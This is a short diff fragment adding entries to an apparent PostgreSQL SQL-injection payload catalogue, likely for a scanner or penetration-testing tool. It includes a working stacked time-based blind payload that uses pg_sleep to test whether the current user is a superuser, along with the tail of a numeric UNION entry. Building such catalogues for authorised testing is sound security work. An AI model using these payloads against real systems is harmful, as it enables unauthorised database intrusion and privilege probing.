+    notes: "Numeric context UNION. No quote needed. Adjust column count to match original query."
+    tags: [version, numeric, extraction]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: timing
+    risk: 3
+    payload: "1; SELECT CASE WHEN (SELECT usesuper FROM pg_user WHERE usename=current_user) THEN pg_sleep(SLEEP_SECONDS) ELSE pg_sleep(0) END--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Numeric stacked query: conditional sleep on superuser status. Delay confirms current user is superuser."
+    tags: [pg_sleep, stacked, numeric, privilege_check, superuser]
